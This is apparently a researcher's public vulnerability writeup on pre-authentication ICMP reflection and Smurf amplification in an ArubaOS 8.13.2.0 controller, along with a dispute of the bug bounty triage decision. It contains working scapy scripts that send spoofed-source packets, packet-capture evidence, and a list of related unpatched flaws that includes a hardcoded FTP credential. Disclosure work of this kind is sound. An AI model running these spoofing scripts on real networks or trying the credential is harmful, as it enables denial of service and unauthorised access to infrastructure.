# Pre-Authentication ICMP Reflection & Smurf Amplification in ArubaOS 8.13.2.0

**Researcher:** Vesqer / JM00NJ  
**Blog:** [netacoding.com](https://netacoding.com)  
**GitHub:** [github.com/JM00NJ](https://github.com/JM00NJ)  
**Date:** June 2026  
**Submission ID:** 09e49fa1 (HPE Networking Product Public Program, Bugcrowd)  
**Status:** Closed as "Not Applicable" — "expected network functionality"  

---

## Background

This writeup documents a pre-authentication ICMP reflection and Smurf amplification vulnerability confirmed with wire-level evidence from two physically separate machines in ArubaOS 8.13.2.0 LSR. The vulnerability was submitted to the HPE Networking Bug Bounty Program on Bugcrowd on May 15, 2026.

Triage closed the submission as "expected network functionality" despite two independent packet captures — one from the attacker machine and one from the victim machine — showing an unsolicited ICMP Echo Reply arriving at a host that sent zero ICMP requests. The RaR is currently pending.

---

## Target

| Field | Value |
|-------|-------|
| Product | HPE Aruba Networking Wireless — AOS-8 Controller |
| Version | ArubaOS 8.13.2.0 LSR (Build 95415, compiled 2026-03-25) |
| Model | ArubaMC-VA-US |
| Component | ICMP Echo handler — IP stack |
| Authentication | None required |
| Protocol | ICMP (IP Protocol 1) |
| CVSS v3.1 | 7.4 High — `AV:A/AC:L/PR:N/UI:N/S:C/C:N/I:N/A:H` |
| CWE | CWE-290 (No Source IP Validation), CWE-406 (Smurf Broadcast Reply) |

---

## Vulnerability Description

ArubaOS 8.13.2.0 contains two weaknesses in its ICMP Echo handler that combine into a confirmed reflection/amplification attack vector:

**Component 1 — No Source IP Validation (CWE-290)**

The controller does not validate the source IP address of incoming ICMP Echo Requests against:
- MAC/IP binding (ARP table consistency)
- Reverse path filtering (uRPF/BCP38 per RFC 2827)

A packet arriving with Source MAC `08:00:27:cc:05:43` (attacker) but Source IP `192.168.56.1` (victim) is accepted without challenge. The controller actively ARP-resolves the spoofed source IP and delivers the Echo Reply to the victim's real MAC address.

**Component 2 — Broadcast Source Reply (CWE-406)**

When the controller receives an ICMP Echo Request with Source IP `192.168.56.255` (subnet broadcast), it generates an Echo Reply with:
- Destination IP: `192.168.56.255`
- Destination MAC: `ff:ff:ff:ff:ff:ff`

This delivers the reply to every host on the L2 segment — the classic Smurf amplification behavior documented in CERT Advisory CA-1998-01.

---

## Lab Setup

```
192.168.56.103  Parrot OS  — Attacker
192.168.56.50   ArubaOS    — Target controller
192.168.56.1    Windows    — Victim (passive, never sent ICMP)
```

---

## Proof of Concept

### Reflection Attack

Send an ICMP Echo Request to the controller with the victim's IP as the spoofed source:

```python
# test_chain1.py — simplified
from scapy.all import *

attacker_mac = "08:00:27:cc:05:43"
controller_ip = "192.168.56.50"
victim_ip = "192.168.56.1"

pkt = Ether(src=attacker_mac) /       IP(src=victim_ip, dst=controller_ip) /       ICMP(type=8, code=0, id=0xc101)

sendp(pkt, iface="eth0", verbose=0)
```

**Attacker PCAP — Key Frames:**

| Frame | Direction | Content |
|-------|-----------|---------|
| 1 | Attacker → Controller | Echo Request src=192.168.56.1 **(SPOOFED)** id=0xc101 |
| 2 | Controller → Victim | Echo Reply dst=192.168.56.1 id=0xc101 |
| 3 | Controller → Broadcast | ARP "Who has 192.168.56.1?" |
| 4 | Victim → Controller | ARP Reply "192.168.56.1 is at 0a:00:27:00:00:11" |

The controller accepted the spoofed source, ARP-resolved the victim, and delivered the reply.

**Victim PCAP — Frame 1:**
```
192.168.56.50 → 192.168.56.1  ICMP Echo Reply  id=0xc101
```

The victim machine received an unsolicited ICMP Echo Reply. It never sent any ICMP Echo Request.

### Smurf Amplification

Send an ICMP Echo Request with the subnet broadcast as the source:

```python
pkt = Ether(src=attacker_mac) /       IP(src="192.168.56.255", dst=controller_ip) /       ICMP(type=8, code=0, id=0xc103)

sendp(pkt, iface="eth0", verbose=0)
```

**Controller reply:**
```
Destination IP:  192.168.56.255
Destination MAC: ff:ff:ff:ff:ff:ff
```

Every host on the subnet receives this Echo Reply.

**Victim PCAP — Frame 4:**
```
192.168.56.50 → 192.168.56.255  ICMP Echo Reply  id=0xc103
```

Smurf amplification confirmed. One packet from the attacker → reply delivered to all N subnet hosts.

---

## Evidence

### Two-Machine Packet Capture

| File | Machine | Content |
|------|---------|---------|
| `parrot_smurf-chain.pcapng` | Attacker (192.168.56.103) | Spoofed request + controller ARP resolution + reply |
| `windows_smurf-chain.pcapng` | Victim (192.168.56.1) | **Unsolicited Echo Reply received** |

The victim-side capture is the primary evidence. A machine that sends zero ICMP requests received an ICMP Echo Reply from the controller. This cannot be explained by "expected network functionality."

### Attack Chain Frame-by-Frame

```
Attacker sends:    IP(src=192.168.56.1, dst=192.168.56.50) / ICMP(type=8, id=0xc101)
Controller ARP:    "Who has 192.168.56.1?" → broadcast
Victim replies:    "192.168.56.1 is at 0a:00:27:00:00:11"
Controller sends:  IP(src=192.168.56.50, dst=192.168.56.1) / ICMP(type=0, id=0xc101)
Victim receives:   Unsolicited Echo Reply (captured in windows_smurf-chain.pcapng)
```

---

## Impact

**Reflection:**
- An unauthenticated attacker causes the controller to deliver ICMP traffic to any victim on the network
- The victim sees traffic from the controller (a trusted infrastructure device), not the attacker
- The controller's IP may be whitelisted by the victim's firewall — reflection bypasses IP-based ACLs
- Attacker identity is obscured

**Smurf Amplification:**
```
1 packet sent by attacker
1 reply from controller
N hosts on L2 segment receive the broadcast reply
Amplification factor: 1:N
```

In an enterprise deployment with multiple AOS-8 controllers on the same management VLAN:
- Spoofed requests to multiple controllers simultaneously → each replies to the victim
- Broadcast replies amplify across the entire management VLAN
- Sustained rate → DoS on victim + congestion on management infrastructure

**As an attacker I could:**
1. Direct unsolicited ICMP traffic from a trusted infrastructure device toward any victim on the network
2. Amplify the traffic across the entire subnet with a single packet per controller
3. Obscure the attack origin behind the controller's IP address
4. Disrupt management VLAN operations by flooding it with broadcast Echo Replies

---

## RFC References

**RFC 1122 Section 3.2.2.6:**
> "An ICMP Echo Request destined to an IP broadcast or IP multicast address MAY be silently discarded."

The same principle applies to source broadcast: replying to a broadcast source address creates Smurf amplification. An enterprise network controller should reject broadcast-source ICMP requests.

**RFC 2827 / BCP38:**
> "Network Ingress Filtering: Defeating Denial of Service Attacks which employ IP Source Address Spoofing"

The absence of uRPF/ingress filtering on the controller's interface is the root cause enabling the reflection component.

**CERT Advisory CA-1998-01:**
Smurf IP Denial-of-Service — documents exactly this attack class. The advisory is 28 years old. The vulnerability was understood and mitigated across the industry before this controller was designed.

---

## Root Cause

| Component | Root Cause | CWE |
|-----------|-----------|-----|
| Source IP spoofing accepted | No uRPF, no MAC/IP binding check before ICMP processing | CWE-290 |
| Broadcast source reply | No rejection of broadcast/multicast source addresses | CWE-406 |
| No rate limiting | Every ICMP Echo Request answered unconditionally | — |

---

## Additional ICMP Stack Findings (Same Firmware)

Identified during systematic testing (8 categories, 100+ test vectors):

| CWE | Finding |
|-----|---------|
| CWE-354 | ICMP checksum not validated — any value accepted |
| CWE-1284 | TTL=0 packets processed — RFC 791 violation |
| CWE-126 | 18-byte buffer over-read via IP Total Length inflation |
| CWE-200 | Timestamp Reply leaks controller clock; IP options leak controller IP |
| CWE-20 | ICMP Code field (0-255) not validated; zero DPI on Echo payload |

---

## Triage Response Analysis

**Triage:** *"The observed behavior appears consistent with expected network functionality."*

An enterprise wireless controller replying to ICMP Echo Requests with spoofed source addresses and delivering unsolicited responses to a machine that sent no requests is not "expected network functionality."

The triage response does not address the victim-side packet capture showing an unsolicited Echo Reply at a host that never sent any request. It does not cite any RFC, standard, or technical reference contradicting the finding. It applies a generic boilerplate closure to a submission with two-machine wire-level evidence.

The Smurf amplification attack (CERT CA-1998-01) has been understood since 1998. Numerous vendors including Cisco, Juniper, and others have patched this exact behavior over the past three decades. An enterprise controller shipping in 2026 without broadcast source rejection is not exhibiting "expected functionality."

---

## Timeline

| Date | Event |
|------|-------|
| 15 May 2026 02:06 UTC | Submission created with two-machine pcap evidence |
| 01 Jun 2026 07:09 UTC | Flo_Bugcrowd: **N/A — "expected network functionality"** |
| 01 Jun 2026 12:20 UTC | RaR submitted citing RFC 1122 + CERT CA-1998-01 + victim pcap |
| 16 Jun 2026 UTC | RaR expiry (pending at time of publication) |

---

## Disclosure Note

Submitted to the HPE Networking Product Public Program on Bugcrowd on May 15, 2026. Closed as "Not Applicable." RaR submitted, pending response.

Per the program's disclosure policy, the 60-day post-advisory window applies to findings the vendor has acknowledged and fixed. The program has classified this as a non-vulnerability, therefore no fix is forthcoming, no advisory will be published, and the post-advisory window does not apply.

This writeup is published to allow the security community to independently evaluate the finding.

---

## Related Submissions (Same Program — Same Firmware)

| ID | Finding | Status |
|----|---------|--------|
| 9e946ca3 | Pre-auth XXE → HTTP SSRF (port 32000) | N/A (RaR expired unanswered) |
| 0c716fec | Pre-auth XXE → FTP SSRF with RETR | N/A (RaR pending) |
| d13d0e83 | Hardcoded FTP credential sap:x (CWE-798) | Active — blocker on researcher |
| c5eda0ae | Ghost Leak TTL=0 + IP over-read (CWE-125/CWE-1284) | N/A |
| b5727197 | ICMP payload relay — zero DPI (CWE-20/CWE-693) | N/A |

---

*Vesqer / JM00NJ — netacoding.com*
